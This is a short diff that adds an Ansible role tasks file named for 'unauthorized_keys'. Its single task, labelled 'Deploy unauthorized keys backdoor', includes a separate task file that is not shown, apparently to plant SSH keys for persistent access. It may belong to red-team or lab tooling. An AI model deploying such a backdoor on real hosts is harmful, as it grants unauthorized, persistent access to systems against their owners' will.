@@ -1,0 +1,6 @@
+---
+# tasks file for unauthorized_keys
+
+- name: "Deploy unauthorized keys backdoor"
+  include_tasks: unauthorized-keys.yml
+  # when: <some-condition>
